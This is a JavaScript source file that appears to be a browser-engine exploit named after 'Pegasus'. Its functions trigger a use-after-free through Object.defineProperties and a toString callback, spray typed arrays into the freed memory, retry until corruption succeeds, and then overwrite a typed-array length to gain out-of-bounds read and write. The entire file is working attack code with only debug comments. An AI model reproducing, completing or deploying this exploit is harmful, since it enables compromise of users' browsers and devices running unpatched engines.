var global_flag = 0;


attempt_pegasus = function(){
	
	gc();

	//var pressure = new Array(100);
	var attempts = new Array(4250000);
	
	//debug("attempting now.");
	var arr = new Array(2047);
	var not_number = {};
	not_number.toString = function(){
		if(arr == null){
			return 10;
		}
		else{
			arr = null;
			props.stale.value = null;
			gc();
			var buffer = new ArrayBuffer(80);
			var uintArray = new Uint32Array(buffer);
			uintArray[0] = 0xAABBCCDD;
			for (i = 0; i < attempts.length; i++){
				attempts[i] = new Uint32Array(buffer);
			}
			return 10;
		}
	};

	var props = {
		p0 : {value : 0},
		p1 : {value : 1},
		p2 : {value : 2},
		p3 : {value : 3},
		p4 : {value : 4},
		p5 : {value : 5},
		p6 : {value : 6},
		p7 : {value : 7},
		p8 : {value : 8},
		length : {value : not_number},
		stale : {value : arr},
		after : {value : 666}
	};
	

	
	var before_len = arr.length;
	var target = [];
	Object.defineProperties(target, props);
	stale = target.stale;
	var after_len = stale.length;
	if(before_len == after_len) {
		return null;
	} else {
		return {stale : stale, attempts: attempts};
	}

}

loop_pegasus = function(){
	var attempt = null;
	while(attempt == null){
		//debug("new attempt");
		attempt = attempt_pegasus();
		//trigger_gc_maybe();
	}
	//debug("succ");
	return attempt;
}


exploit_main = function(){
	var corrupted = loop_pegasus();
	var stale = corrupted["stale"];
	var attempts = corrupted["attempts"];
	
	//modify length loop
	/*
	for(var i = 0; i < 10000; i++){
		stale[i] = 0x0FFFFFFF - i;
	}
	*/

	stale[8370] = 0x40000000;

	//release info
	debug("found the snitch!");
	debug(attempts[0].length);
	//debug(0x0FFFFFFF - attempts[i].length);



	return corrupted;

	/*
	for(var i = 0; i < attempts.length; i++){
		if(attempts[0].length != 20) {
			debug(i);
			debug("found the snitch!", i);
			debug(attempts[i].length);
			debug(0x0FFFFFFF - attempts[i].length);
			return corrupted;
		}
	}
	*/


	//debug("done");
	return corrupted;
}

test_range = function(corrupted, offset, range){

	var stale = corrupted.stale;
	var target = corrupted.attempts[0];

	for(var i = 0; i < range; i++){
		debug("changing @ stale[" + (offset + i) + "]");
		debug("before change, stale[i] = " + stale[offset + i]);
		stale[offset + i] = 0x0;
		debug(target[0]);
	}

	return corrupted;
}